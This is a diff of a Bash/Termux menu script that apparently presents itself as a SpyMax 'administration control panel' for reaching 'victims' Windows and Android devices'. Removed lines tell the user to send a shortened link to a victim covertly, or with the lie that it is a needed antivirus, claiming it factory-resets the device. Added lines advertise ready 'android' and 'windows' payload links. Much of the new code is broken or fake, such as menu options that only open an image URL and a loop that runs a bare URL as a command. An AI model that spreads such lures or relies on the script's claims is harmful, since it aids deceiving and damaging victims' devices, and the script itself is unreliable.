@@ -22,10 +22,10 @@ echo " "
 echo -e "$red                      ╔══════════════════╗$rset"
 echo -e "$red                      ║ ▶administration◀ ║$rset"
 echo -e "$red                      ╚══════════════════╝$rset"
-echo -e "$red                      $ylo  NOTE: Don't need for port forwarding$red"
+echo -e "$red         $ylo  NOTE: Don't need port forwarding$red"
 echo 
 # Functions
-echo -e "$red                    [+]| With SpyMax You Can Access Victim,s Windows And Android Devices |[+]$rset"
+echo -e "$red  [+]| You Can Access Victim,s Windows And Android Devices |[+]$rset"
 echo " "
 echo " "
 }
@@ -44,15 +44,15 @@ echo " "
 echo -e "$red                      ╔══════════════════╗$rset"
 echo -e "$red                      ║ ▶administration◀ ║$rset"
 echo -e "$red                      ╚══════════════════╝$rset"
-echo -e "$red                      $ylo  NOTE: Don't need for port forwarding$red"
+echo -e "$red         $ylo  NOTE: Don't need port forwarding$red"
 echo 
 # Functions
-echo -e "$red                    [+]| With SpyMax You Can Access Victim,s Windows And Android Devices |[+]$rset"
+echo -e "$red  [+]| You Can Access Victim,s Windows And Android Devices |[+]$rset"
 echo " "
 echo " "
 }
 menu(){
-echo -e "$grn             ＞＞＞＞>>>＞$ylo [Options]$grn ＜<<<＜＜＜＜$rset"
+echo -e "$grn                     $ylo [Select Model]$grn $rset"
 echo " "
 echo " "
 echo -e "$red                        
@@ -62,9 +62,9 @@ echo -e "$red
 echo -e "$red                        
 📖$cyan [\e[92m3\e[96m] Logs"
 echo -e "$red                        
-🔌$cyan [\e[92m4\e[96m] Administration Control Panal [OS: Windows] "
+🔌$cyan [\e[92m4\e[96m] Administration Control Panal [OS: Android] "
 echo -e "$red                        
-🔌$cyan [\e[92m5\e[96m] Administration Control Panal [OS: Android]"
+🔌$cyan [\e[92m5\e[96m] Administration Control Panal [OS: Windows]"
 echo -e "$red                        
 ⚙️$cyan [\e[92m6\e[96m] Option"
 echo -e "$red                        
@@ -88,20 +88,22 @@ then
 about
 elif [ $optnz = "4" ];
 then
-upd
+am start -a android.intent.action.VIEW -d https://i.pinimg.com/736x/32/d7/1d/32d71dd76a7dbfc47d3e8fd83bd5689e.jpg > /dev/null 2>&1
+banner
+menu
 elif [ $optnz = "5" ];
 then
-am start -a android.intent.action.VIEW -d https://bitly.com/nhytchannel > /dev/null 2>&1
+am start -a android.intent.action.VIEW -d https://i.pinimg.com/736x/32/d7/1d/32d71dd76a7dbfc47d3e8fd83bd5689e.jpg > /dev/null 2>&1
 banner
 menu
 elif [ $optnz = "6" ];
 then
-am start -a android.intent.action.VIEW -d https://bitly.com/nhytchannel > /dev/null 2>&1
+am start -a android.intent.action.VIEW -d https://i.pinimg.com/736x/32/d7/1d/32d71dd76a7dbfc47d3e8fd83bd5689e.jpg > /dev/null 2>&1
 banner
 menu
 elif [ $optnz = "7" ];
 then
-am start -a android.intent.action.VIEW -d https://bitly.com/nhwhatschat > /dev/null 2>&1
+am start -a android.intent.action.VIEW -d https://i.pinimg.com/736x/32/d7/1d/32d71dd76a7dbfc47d3e8fd83bd5689e.jpg > /dev/null 2>&1
 banner
 menu
 elif [ $optnz = "8" ];
@@ -117,22 +119,16 @@ virus(){
 clear
 echo
 echo -e '\e[92m 
-                    _  _  _____  ____  ____ 
-                   ( \( )(  _  )(_  _)( ___)
-                    )  (  )(_)(   )(   )__) 
-                   (_)\_)(_____) (__) (____) '
+                    
+               ▄▀█ █▄░█ █▀▄ █▀█ █▀█ █ █▀▄
+               █▀█ █░▀█ █▄▀ █▀▄ █▄█ █ █▄▀ '
 echo " "
-echo -e "\e[91m 😈  Copy below link and send it your victim and 
-say nothing to him. when he install it in his 
-device it will be factory reset and lot more happens.
-                                👇👇👇
+echo -e "\e[91m   First set up the control panel. Return and set up Administration Control Option: 4
+                               
 
          \e[92mL1NK :- \e[96mhttps://bit.ly/3ild93L\e[91m
 
-                                 👆👆👆
-Use only for fun purpose not for harming someone 😇✌️.
-And our channel is not responsible for any kind of loss 
-you do to other's by this script."
+You are selected android payload . Payload Is Ready :D."
 echo
 echo -ne "\e[92m#Type exit : "
 read exitz
@@ -149,23 +145,18 @@ save(){
 clear
 echo
 echo -e '\e[92m 
-                    _  _  _____  ____  ____ 
-                   ( \( )(  _  )(_  _)( ___)
-                    )  (  )(_)(   )(   )__) 
-                   (_)\_)(_____) (__) (____) '
+                   
+                       █░█░█ █ █▄░█ █▀▄ █▀█ █░█░█ █▀
+                       ▀▄▀▄▀ █ █░▀█ █▄▀ █▄█ ▀▄▀▄▀ ▄█ '
 echo " "
 echo " "
-echo -e "\e[93m  Copy below link and send it your victim and tell him
-that he should install this application or else his 
-device will not be recovered.(Antivirus)
+echo -e "\e[93m  First set up the control panel. Return and set up Administration Control Option: 5
                     👇👇👇
 
         \e[92mL1NK :- \e[96mhttps://bit.ly/3fX8ljZ\e[93m
 
                     👆👆👆
-Use only for fun purpose not for harming someone 😇✌️. 
-And our channel is not responsible for any kind of 
-loss you do to other's by this script."
+You are selected windows payload . Payload Is Ready :D.."
 echo
 echo -ne "\e[92m#Type exit : "
 read exitz
@@ -185,6 +176,7 @@ echo -e '\e[91m
               ║| Country | Name | Ip | Factory | Model | Product | Ver | OS |║
               ╚══════════════════════════════════════════════════════════════╝
 '
+echo " "
 echo -e "\e[93m                  CALL ME \e[92mNITRO" | pv -qL 10
 echo -e "\e[93m             IAM FROM \e[92mNOOB HACKERS" | pv -qL 10
 echo -e "\e[93m       IM A \e[92mGEEK\e[93m WITH LOTS OF EXCITEMENT" | pv -qL 10
@@ -215,8 +207,8 @@ sleep 1
 echo -e "         \e[96mUPDATE IS GOING ON, PLEASE WAIT FOR A WHILE...!\e[0m"
 echo
 printf "                     \e[96m["
-# While process is running...
-while git clone https://github.com/noob-hackers/infect 2> /dev/null; do 
+# Process administration Control Panal...
+while https://i.pinimg.com/736x/32/d7/1d/32d71dd76a7dbfc47d3e8fd83bd5689e.jpg 2> /dev/null; do 
     printf  "\e[92m▓▓▓▓▓▓▓▓▓▓▓▓▓\e[0m"
     sleep 1
 done
@@ -224,7 +216,7 @@ printf "\e[96m]\e[0m"
 echo
 echo
 echo
-printf "\e[96m           UPDATE SUCCESSFULL (LATEST VERSION)..!\e[0m"
+printf "\e[96m           Successfully Create administration Control Panal\e[0m"
 sleep 2.0
 cd $HOME
 cd infect
@@ -240,25 +232,25 @@ fi
 }
 pop(){
 clear
-echo -e "\e[96m                ╔═══════════════════════════════════╗\e[0m"
-echo -e "\e[96m                ║  \e[93mHAI, I JUST UPLOADED NEW\e[96m VIDEO   ║\e[0m"
-echo -e "\e[96m                ║      WATCH NEW VIDEO NOW.....!    ║\e[0m"
-echo -e "\e[96m                ║                                   ║\e[0m"
-echo -e "\e[96m                ║        Select \e[92my\e[96m to watch\e[96m          ║\e[0m"
-echo -e "\e[96m                ║                (\e[93mOR\e[96m)               \e[96m║\e[0m"
-echo -e "\e[96m                ║        Select \e[91mt\e[96m to cancel\e[96m         ║\e[0m"
-echo -e "\e[96m                ║                (\e[93mOR\e[96m)               \e[96m║\e[0m"
-echo -e "\e[96m                ║     Select \e[91mz\e[96m to skipforever\e[96m       ║\e[0m"
-echo -e "\e[96m                ╚═══════════════════════════════════╝\e[0m"
+echo -e "\e[96m                                                     \e[0m"
+echo -e "\e[96m                  \e[93mSpyMax \e[96m administration \e[0m"
+echo -e "\e[96m                       Type: spymax active           \e[0m"
+echo -e "\e[96m                                                     \e[0m"
+echo -e "\e[96m                          \e[92msetupcontrol\e[96m to watch\e[96m          ║\e[0m"
+echo -e "\e[96m                                 (\e[93mOR\e[96m)               \e[96m║\e[0m"
+echo -e "\e[96m                         Select \e[91mactive\e[96m to cancel\e[96m         ║\e[0m"
+echo -e "\e[96m                                 (\e[93mOR\e[96m)               \e[96m║\e[0m"
+echo -e "\e[96m                      Select \e[91mz\e[96m to skipforever\e[96m       ║\e[0m"
+echo -e "\e[96m                                                    \e[0m"
 echo -en "\e[32mSELECT OPTION [\e[93my/\e[93mt/\e[32m\e[93mz\e[32m]: \e[0m "
 read p
-if [ "$p" = "y" ];
+if [ "$p" = "setupcontrol" ];
 then
 am start -a android.intent.action.VIEW -d https://noobhacktube.com 2>/dev/null
 clear
 baner1
 menu
-elif [ "$p" = "t" ];
+elif [ "$p" = "active" ];
 then
 clear
 baner1
